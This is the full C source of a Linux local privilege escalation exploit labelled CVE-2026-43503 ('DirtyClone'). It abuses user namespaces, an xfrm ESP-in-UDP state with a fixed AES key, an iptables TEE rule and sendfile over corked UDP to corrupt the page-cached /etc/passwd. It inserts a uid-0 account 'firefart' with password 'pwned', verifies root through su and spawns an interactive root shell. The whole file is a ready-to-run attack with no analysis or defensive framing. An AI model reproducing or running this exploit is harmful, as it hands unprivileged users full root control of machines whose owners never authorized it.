#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <pwd.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/sendfile.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>

#ifndef SOL_UDP
#define SOL_UDP 17
#endif
#ifndef UDP_CORK
#define UDP_CORK 1
#endif
#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif

#define CLONE_NEWUSER 0x10000000
#define CLONE_NEWNET  0x40000000

#define IGNORE(x) do { if (x) {} } while (0)

static const uint8_t KEY[16] = {
	0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15
};
#define SPI      0x1000
#define PORT     4500
#define PASSWD   "/etc/passwd"
#define ACCOUNT  "firefart"
#define PASSWORD "pwned"
#define HASH     "$6$dcl0salt$8CQdeTvAZwavck5YAsQNIoBP.Vj3UvKNyjPXvuuhjnaksDbye8yGY6.1AaxTkNk1APd6e.hYT8yQ9wEzcOJmN0"

static const uint8_t aes_sbox[256] = {
	0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
	0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
	0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
	0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
	0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
	0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
	0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
	0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
	0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
	0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
	0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
	0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
	0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
	0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
	0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
	0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
};

static const uint8_t aes_inv_sbox[256] = {
	0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
	0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
	0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
	0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
	0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
	0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
	0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
	0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
	0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
	0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
	0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
	0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
	0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
	0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
	0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
	0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
};

static uint8_t gf_mul2(uint8_t a)
{
	return (a & 0x80) ? ((a << 1) ^ 0x1b) : (a << 1);
}

static uint8_t gf_mul4(uint8_t a) { return gf_mul2(gf_mul2(a)); }
static uint8_t gf_mul8(uint8_t a) { return gf_mul2(gf_mul4(a)); }
static uint8_t gf_mul9(uint8_t a)  { return gf_mul8(a) ^ a; }
static uint8_t gf_mul11(uint8_t a) { return gf_mul8(a) ^ gf_mul2(a) ^ a; }
static uint8_t gf_mul13(uint8_t a) { return gf_mul8(a) ^ gf_mul4(a) ^ a; }
static uint8_t gf_mul14(uint8_t a) { return gf_mul8(a) ^ gf_mul4(a) ^ gf_mul2(a); }

static void aes_key_expand(uint32_t rk[44], const uint8_t key[16])
{
	static const uint8_t rcon[10] = {
		0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36
	};
	for (int i = 0; i < 4; i++)
		rk[i] = ((uint32_t)key[4*i]<<24) | ((uint32_t)key[4*i+1]<<16) |
			((uint32_t)key[4*i+2]<<8) | (uint32_t)key[4*i+3];
	for (int i = 4; i < 44; i++) {
		uint32_t t = rk[i-1];
		if ((i & 3) == 0) {
			t = (t<<8) | (t>>24);
			uint8_t a0 = aes_sbox[(t>>24)&0xff];
			uint8_t a1 = aes_sbox[(t>>16)&0xff];
			uint8_t a2 = aes_sbox[(t>>8)&0xff];
			uint8_t a3 = aes_sbox[t&0xff];
			t = ((uint32_t)a0<<24)|((uint32_t)a1<<16)|((uint32_t)a2<<8)|a3;
			t ^= (uint32_t)rcon[i/4-1] << 24;
		}
		rk[i] = rk[i-4] ^ t;
	}
}

static void inv_sub_bytes(uint8_t s[16])
{
	for (int i = 0; i < 16; i++)
		s[i] = aes_inv_sbox[s[i]];
}

static void inv_shift_rows(uint8_t s[16])
{
	uint8_t t;
	t = s[13]; s[13] = s[9]; s[9] = s[5]; s[5] = s[1]; s[1] = t;
	t = s[2]; s[2] = s[10]; s[10] = t;
	t = s[6]; s[6] = s[14]; s[14] = t;
	t = s[15]; s[15] = s[11]; s[11] = s[7]; s[7] = s[3]; s[3] = t;
}

static void inv_mix_columns(uint8_t s[16])
{
	for (int i = 0; i < 4; i++) {
		int j = i * 4;
		uint8_t a0 = s[j], a1 = s[j+1], a2 = s[j+2], a3 = s[j+3];
		s[j]   = gf_mul14(a0) ^ gf_mul11(a1) ^ gf_mul13(a2) ^ gf_mul9(a3);
		s[j+1] = gf_mul9(a0) ^ gf_mul14(a1) ^ gf_mul11(a2) ^ gf_mul13(a3);
		s[j+2] = gf_mul13(a0) ^ gf_mul9(a1) ^ gf_mul14(a2) ^ gf_mul11(a3);
		s[j+3] = gf_mul11(a0) ^ gf_mul13(a1) ^ gf_mul9(a2) ^ gf_mul14(a3);
	}
}

static void add_round_key(uint8_t s[16], const uint32_t rk[4])
{
	for (int i = 0; i < 4; i++) {
		s[4*i]   ^= (rk[i] >> 24) & 0xff;
		s[4*i+1] ^= (rk[i] >> 16) & 0xff;
		s[4*i+2] ^= (rk[i] >> 8) & 0xff;
		s[4*i+3] ^= rk[i] & 0xff;
	}
}

static void aes_ecb_decrypt(uint8_t out[16], const uint8_t in[16], const uint32_t rk[44])
{
	uint8_t s[16];
	memcpy(s, in, 16);
	add_round_key(s, rk + 40);
	for (int round = 9; round >= 1; round--) {
		inv_shift_rows(s);
		inv_sub_bytes(s);
		add_round_key(s, rk + round * 4);
		inv_mix_columns(s);
	}
	inv_shift_rows(s);
	inv_sub_bytes(s);
	add_round_key(s, rk + 0);
	memcpy(out, s, 16);
}

static void compute_ivs(const uint8_t *data, size_t datalen, int *nblocks, uint8_t ivs[][16], int maxblocks)
{
	const uint8_t *nl = memchr(data, '\n', datalen);
	if (!nl) { fprintf(stderr, "[-] no newline in /etc/passwd\n"); exit(1); }
	size_t root_line_len = nl - data + 1;
	char entry[512];
	int entry_len = snprintf(entry, sizeof(entry), "%s:%s:0:0:pwned:/root:/bin/bash\n", ACCOUNT, HASH);
	if (entry_len < 0 || entry_len >= (int)sizeof(entry)) { fprintf(stderr, "[-] entry too long\n"); exit(1); }
	size_t prefix_len = root_line_len + entry_len;
	int blocks = (prefix_len + 15) / 16;
	size_t size = blocks * 16;
	if (size > datalen) {
		fprintf(stderr, "[-] file too small (%zu bytes), need at least %zu\n", datalen, size);
		exit(1);
	}
	if (blocks > maxblocks) {
		fprintf(stderr, "[-] too many blocks\n");
		exit(1);
	}
	*nblocks = blocks;
	uint32_t rk[44];
	aes_key_expand(rk, KEY);
	uint8_t target[size];
	memcpy(target, data, root_line_len);
	memcpy(target + root_line_len, entry, entry_len);
	memset(target + root_line_len + entry_len, '#', size - root_line_len - entry_len);
	uint8_t decrypted[16];
	for (int i = 0; i < blocks; i++) {
		aes_ecb_decrypt(decrypted, data + i * 16, rk);
		for (int j = 0; j < 16; j++)
			ivs[i][j] = decrypted[j] ^ target[i * 16 + j];
	}
}

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void enter_namespace(void)
{
	uid_t ruid = getuid();
	gid_t rgid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		perror("unshare"); exit(1);
	}
	write_proc("/proc/self/setgroups", "deny");
	char map[64];
	snprintf(map, sizeof(map), "0 %u 1", ruid);
	if (write_proc("/proc/self/uid_map", map) < 0) {
		perror("uid_map"); exit(1);
	}
	snprintf(map, sizeof(map), "0 %u 1", rgid);
	if (write_proc("/proc/self/gid_map", map) < 0) {
		perror("gid_map"); exit(1);
	}
}

static void configure_xfrm(void)
{
	char cmd[1024];
	int r;
	r = system("ip link set lo up 2>/dev/null");
	(void)r;
	snprintf(cmd, sizeof(cmd),
		"ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp spi %d reqid 1 "
		"mode transport enc 'cbc(aes)' 0x%02x%02x%02x%02x%02x%02x%02x%02x"
		"%02x%02x%02x%02x%02x%02x%02x%02x "
		"auth 'digest_null' '' encap espinudp %d %d 0.0.0.0 2>/dev/null",
		SPI,
		KEY[0],KEY[1],KEY[2],KEY[3],KEY[4],KEY[5],KEY[6],KEY[7],
		KEY[8],KEY[9],KEY[10],KEY[11],KEY[12],KEY[13],KEY[14],KEY[15],
		PORT, PORT);
	r = system(cmd);
	if (r != 0) { fprintf(stderr, "[-] ip xfrm state add failed\n"); exit(1); }
	snprintf(cmd, sizeof(cmd),
		"ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir in "
		"tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid 1 mode transport 2>/dev/null");
	r = system(cmd);
	if (r != 0) { fprintf(stderr, "[-] ip xfrm policy add failed\n"); exit(1); }
	snprintf(cmd, sizeof(cmd),
		"iptables -t mangle -A OUTPUT -p udp --dport %d -j TEE --gateway 127.0.0.2 2>/dev/null",
		PORT);
	r = system(cmd);
	if (r != 0) { fprintf(stderr, "[-] iptables TEE failed\n"); exit(1); }
}

static void write_block(int file_fd, off_t offset, const uint8_t iv[16])
{
	int sock = socket(AF_INET, SOCK_DGRAM, 0);
	if (sock < 0) { perror("socket"); return; }
	int cork = 1;
	setsockopt(sock, SOL_UDP, UDP_CORK, &cork, sizeof(cork));
	struct sockaddr_in dst = {
		.sin_family = AF_INET,
		.sin_port = htons(PORT),
		.sin_addr = { inet_addr("127.0.0.1") },
	};
	if (connect(sock, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
		perror("connect"); close(sock); return;
	}
	uint8_t header[8];
	*(uint32_t*)(header + 0) = htonl(SPI);
	*(uint32_t*)(header + 4) = htonl(1);
	struct iovec iov[2];
	iov[0].iov_base = header;
	iov[0].iov_len = 8;
	iov[1].iov_base = (void*)iv;
	iov[1].iov_len = 16;
	struct msghdr msg = {0};
	msg.msg_iov = iov;
	msg.msg_iovlen = 2;
	sendmsg(sock, &msg, MSG_MORE);
	off_t off = offset;
	sendfile(sock, file_fd, &off, 16);
	cork = 0;
	setsockopt(sock, SOL_UDP, UDP_CORK, &cork, sizeof(cork));
	send(sock, "", 0, 0);
	close(sock);
	usleep(60000);
}

static int account_exists(void)
{
	struct passwd *pw = getpwnam(ACCOUNT);
	return pw != NULL;
}

static int do_su_cmd(const char *account, const char *cmd)
{
	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0) { perror("posix_openpt"); return -1; }
	grantpt(master);
	unlockpt(master);
	char *slave = ptsname(master);
	pid_t pid = fork();
	if (pid == 0) {
		close(master);
		setsid();
		int fd = open(slave, O_RDWR);
		if (fd < 0) _exit(127);
		dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
		if (fd > 2) close(fd);
		execlp("su", "su", account, "-c", cmd, NULL);
		_exit(127);
	}
	usleep(800000);
	char pwbuf[64];
	int plen = snprintf(pwbuf, sizeof(pwbuf), "%s\n", PASSWORD);
	IGNORE(write(master, pwbuf, plen));
	uint8_t buf[4096];
	ssize_t n;
	while ((n = read(master, buf, sizeof(buf))) > 0) {
		IGNORE(write(1, buf, n));
	}
	int status;
	waitpid(pid, &status, 0);
	close(master);
	return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

static void interactive_shell(const char *account)
{
	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0) { perror("posix_openpt"); return; }
	grantpt(master);
	unlockpt(master);
	char *slave = ptsname(master);
	pid_t pid = fork();
	if (pid == 0) {
		close(master);
		setsid();
		int fd = open(slave, O_RDWR);
		if (fd < 0) _exit(127);
		dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
		if (fd > 2) close(fd);
		execlp("su", "su", account, "-c", "exec /bin/sh", NULL);
		_exit(127);
	}
	usleep(800000);
	char pwbuf[64];
	int plen = snprintf(pwbuf, sizeof(pwbuf), "%s\n", PASSWORD);
	IGNORE(write(master, pwbuf, plen));
	struct pollfd fds[2];
	fds[0].fd = master;
	fds[0].events = POLLIN;
	fds[1].fd = 0;
	fds[1].events = POLLIN;
	char buf[4096];
	while (1) {
		int ret = poll(fds, 2, 30000);
		if (ret <= 0) break;
		if (fds[0].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0) break;
			IGNORE(write(1, buf, n));
		}
		if (fds[1].revents & POLLIN) {
			ssize_t n = read(0, buf, sizeof(buf));
			if (n <= 0) break;
			IGNORE(write(master, buf, n));
		}
	}
	close(master);
	waitpid(pid, NULL, 0);
}

int main(void)
{
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	printf("[*] CVE-2026-43503 (DirtyClone) local privilege escalation\n");
	printf("[*] uid=%d -> root\n", getuid());

	int fd = open(PASSWD, O_RDONLY);
	if (fd < 0) { perror("open " PASSWD); return 1; }
	struct stat st;
	if (fstat(fd, &st) < 0) { perror("fstat"); close(fd); return 1; }
	size_t datalen = st.st_size;
	uint8_t *data = malloc(datalen);
	if (!data) { perror("malloc"); close(fd); return 1; }
	if (read(fd, data, datalen) != (ssize_t)datalen) { perror("read"); free(data); close(fd); return 1; }

	uint8_t ivs[256][16];
	int nblocks;
	compute_ivs(data, datalen, &nblocks, ivs, 256);

	pid_t cpid = fork();
	if (cpid < 0) { perror("fork"); return 1; }
	if (cpid == 0) {
		enter_namespace();
		configure_xfrm();
		int encap = socket(AF_INET, SOCK_DGRAM, 0);
		if (encap < 0) { perror("encap socket"); _exit(1); }
		int one = 1;
		setsockopt(encap, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
		struct sockaddr_in bindaddr = {
			.sin_family = AF_INET,
			.sin_port = htons(PORT),
			.sin_addr = { INADDR_ANY },
		};
		if (bind(encap, (struct sockaddr*)&bindaddr, sizeof(bindaddr)) < 0) {
			perror("bind encap"); _exit(1);
		}
		int encap_val = UDP_ENCAP_ESPINUDP;
		if (setsockopt(encap, IPPROTO_UDP, UDP_ENCAP, &encap_val, sizeof(encap_val)) < 0) {
			perror("UDP_ENCAP"); _exit(1);
		}
		int rfd = open(PASSWD, O_RDONLY);
		if (rfd < 0) { perror("open passwd"); _exit(1); }
		int dummy = open(PASSWD, O_RDONLY);
		if (dummy >= 0) {
			char dbuf[4096];
			IGNORE(read(dummy, dbuf, sizeof(dbuf)));
			close(dummy);
		}
		for (int i = 0; i < nblocks; i++)
			write_block(rfd, (off_t)(i * 16), ivs[i]);
		usleep(400000);
		close(rfd);
		close(encap);
		_exit(0);
	}
	int status;
	waitpid(cpid, &status, 0);
	free(data);
	close(fd);

	if (!account_exists()) {
		printf("[-] failed: target not vulnerable or unprivileged user namespaces restricted\n");
		return 1;
	}
	printf("[+] injected uid 0 account '%s' (password: %s)\n", ACCOUNT, PASSWORD);
	int rc = do_su_cmd(ACCOUNT, "id");
	if (rc != 0) return 1;
	printf("[+] root achieved\n");
	if (isatty(0))
		interactive_shell(ACCOUNT);
	return 0;
}
